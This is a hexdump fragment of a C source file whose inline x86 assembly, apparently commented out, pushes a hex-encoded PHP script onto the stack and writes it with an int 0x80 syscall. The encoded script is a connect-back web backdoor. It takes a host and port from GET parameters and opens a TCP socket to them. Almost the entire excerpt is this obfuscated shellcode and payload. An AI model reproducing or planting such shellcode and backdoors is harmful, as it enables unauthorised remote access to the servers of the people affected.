00001190  09 09 22 70 75 73 68 20  24 30 78 32 30 32 63 36  |.."push $0x202c6|
000011a0  62 36 33 3b 20 70 75 73  68 20 24 30 78 36 66 37  |b63; push $0x6f7|
000011b0  33 32 34 32 38 3b 20 70  75 73 68 20 24 30 78 37  |32428; push $0x7|
000011c0  34 36 33 36 35 36 65 3b  20 70 75 73 68 20 24 30  |463656e; push $0|
000011d0  78 36 65 36 66 36 33 35  66 3b 22 0d 0a 09 09 09  |x6e6f635f;".....|
000011e0  22 70 75 73 68 20 24 30  78 37 34 36 35 36 62 36  |"push $0x74656b6|
000011f0  33 3b 20 70 75 73 68 20  24 30 78 36 66 37 33 33  |3; push $0x6f733|
00001200  62 32 39 3b 20 70 75 73  68 20 24 30 78 35 30 34  |b29; push $0x504|
00001210  33 35 34 35 66 3b 20 70  75 73 68 20 24 30 78 34  |3545f; push $0x4|
00001220  63 34 66 35 33 32 63 3b  22 0d 0a 09 09 09 22 70  |c4f532c;"....."p|
00001230  75 73 68 20 24 30 78 34  64 34 31 34 35 35 32 3b  |ush $0x4d414552;|
00001240  20 70 75 73 68 20 24 30  78 35 34 35 33 35 66 34  | push $0x54535f4|
00001250  62 3b 20 70 75 73 68 20  24 30 78 34 33 34 66 35  |b; push $0x434f5|
00001260  33 32 63 3b 20 70 75 73  68 20 24 30 78 35 34 34  |32c; push $0x544|
00001270  35 34 65 34 39 3b 22 0d  0a 09 09 09 22 70 75 73  |54e49;"....."pus|
00001280  68 20 24 30 78 35 66 34  36 34 31 32 38 3b 20 70  |h $0x5f464128; p|
00001290  75 73 68 20 24 30 78 36  35 37 34 36 31 36 35 3b  |ush $0x65746165;|
000012a0  20 70 75 73 68 20 24 30  78 37 32 36 33 35 66 37  | push $0x72635f7|
000012b0  34 3b 20 70 75 73 68 20  24 30 78 36 35 36 62 36  |4; push $0x656b6|
000012c0  33 36 66 3b 22 0d 0a 09  09 09 22 70 75 73 68 20  |36f;"....."push |
000012d0  24 30 78 37 33 33 64 36  62 36 33 3b 20 70 75 73  |$0x733d6b63; pus|
000012e0  68 20 24 30 78 36 66 37  33 32 34 33 62 3b 20 70  |h $0x6f73243b; p|
000012f0  75 73 68 20 24 30 78 35  64 32 37 37 34 37 32 3b  |ush $0x5d277472;|
00001300  20 70 75 73 68 20 24 30  78 36 66 37 30 32 37 35  | push $0x6f70275|
00001310  62 3b 22 20 0d 0a 09 09  09 22 70 75 73 68 20 24  |b;" ....."push $|
00001320  30 78 35 34 34 35 34 37  35 66 3b 20 70 75 73 68  |0x5445475f; push|
00001330  20 24 30 78 32 34 33 64  37 34 37 32 3b 20 70 75  | $0x243d7472; pu|
00001340  73 68 20 24 30 78 36 66  37 30 32 34 33 62 3b 20  |sh $0x6f70243b; |
00001350  70 75 73 68 20 24 30 78  32 39 35 64 32 37 37 34  |push $0x295d2774|
00001360  3b 22 20 0d 0a 09 09 09  22 70 75 73 68 20 24 30  |;" ....."push $0|
00001370  78 37 33 36 66 36 38 32  37 3b 20 70 75 73 68 20  |x736f6827; push |
00001380  24 30 78 35 62 35 34 34  35 34 37 3b 20 70 75 73  |$0x5b544547; pus|
00001390  68 20 24 30 78 35 66 32  34 32 38 36 35 3b 20 70  |h $0x5f242865; p|
000013a0  75 73 68 20 24 30 78 36  64 36 31 36 65 37 39 3b  |ush $0x6d616e79;|
000013b0  22 20 0d 0a 09 09 09 22  70 75 73 68 20 24 30 78  |" ....."push $0x|
000013c0  36 32 37 34 37 33 36 66  3b 20 70 75 73 68 20 24  |6274736f; push $|
000013d0  30 78 36 38 37 34 36 35  36 37 3b 20 70 75 73 68  |0x68746567; push|
000013e0  20 24 30 78 33 64 37 33  37 33 36 35 3b 20 70 75  | $0x3d737365; pu|
000013f0  73 68 20 24 30 78 37 32  36 34 36 34 36 31 3b 22  |sh $0x72646461;"|
00001400  20 0d 0a 09 09 09 22 70  75 73 68 20 24 30 78 32  | ....."push $0x2|
00001410  34 37 62 36 35 37 33 3b  20 70 75 73 68 20 24 30  |47b6573; push $0|
00001420  78 36 63 36 35 37 64 33  62 3b 20 70 75 73 68 20  |x6c657d3b; push |
00001430  24 30 78 32 39 32 32 32  65 33 34 3b 20 70 75 73  |$0x29222e34; pus|
00001440  68 20 24 30 78 33 30 33  34 32 30 37 32 3b 22 20  |h $0x30342072;" |
00001450  0d 0a 09 09 09 22 70 75  73 68 20 24 30 78 36 66  |....."push $0x6f|
00001460  37 32 37 32 34 35 3b 20  70 75 73 68 20 24 30 78  |727245; push $0x|
00001470  32 32 32 38 37 34 36 65  3b 20 70 75 73 68 20 24  |2228746e; push $|
00001480  30 78 36 39 37 32 37 30  37 62 3b 20 70 75 73 68  |0x6972707b; push|
00001490  20 24 30 78 32 39 35 64  32 37 37 34 3b 22 20 0d  | $0x295d2774;" .|
000014a0  0a 09 09 09 22 70 75 73  68 20 24 30 78 37 32 36  |...."push $0x726|
000014b0  66 37 30 32 37 3b 20 70  75 73 68 20 24 30 78 35  |f7027; push $0x5|
000014c0  62 35 34 34 35 34 37 3b  20 70 75 73 68 20 24 30  |b544547; push $0|
000014d0  78 35 66 32 34 32 31 32  36 3b 20 70 75 73 68 20  |x5f242126; push |
000014e0  24 30 78 32 36 35 64 32  37 37 34 3b 22 20 0d 0a  |$0x265d2774;" ..|
000014f0  09 09 09 22 70 75 73 68  20 24 30 78 37 33 36 66  |..."push $0x736f|
00001500  36 38 32 37 3b 20 70 75  73 68 20 24 30 78 35 62  |6827; push $0x5b|
00001510  35 34 34 35 34 37 3b 20  70 75 73 68 20 24 30 78  |544547; push $0x|
00001520  35 66 32 34 32 31 32 38  3b 20 70 75 73 68 20 24  |5f242128; push $|
00001530  30 78 36 36 36 39 32 30  35 30 3b 22 0d 0a 09 09  |0x66692050;"....|
00001540  09 22 70 75 73 68 20 24  30 78 34 38 35 30 33 66  |."push $0x48503f|
00001550  33 63 3b 22 0d 0a 09 09  09 0d 0a 09 09 20 20 20  |3c;".........   |
00001560  22 78 6f 72 20 25 65 61  78 2c 20 25 65 61 78 3b  |"xor %eax, %eax;|
00001570  22 0d 0a 09 20 20 20 20  09 20 20 20 22 6d 6f 76  |"...    .   "mov|
00001580  20 25 65 73 70 2c 20 25  65 73 69 3b 22 09 20 20  | %esp, %esi;".  |
00001590  20 20 0d 0a 09 09 20 20  20 22 6d 6f 76 62 20 24  |  ....   "movb $|
000015a0  30 78 30 34 2c 20 25 61  6c 3b 22 0d 0a 09 09 20  |0x04, %al;".... |
000015b0  20 20 22 6d 6f 76 20 25  65 73 70 2c 20 25 65 63  |  "mov %esp, %ec|
000015c0  78 3b 22 20 0d 0a 09 09  20 20 20 22 6d 6f 76 20  |x;" ....   "mov |
000015d0  24 30 78 31 36 32 2c 20  25 64 78 3b 22 20 0d 0a  |$0x162, %dx;" ..|
000015e0  09 09 20 20 20 22 69 6e  74 20 24 30 78 38 30 3b  |..   "int $0x80;|
000015f0  22 29 3b 0d 0a 0d 0a 09  2a 2f 0d 0a 09 09 0d 0a  |");.....*/......|
00001600  7d                                                |}|
00001601
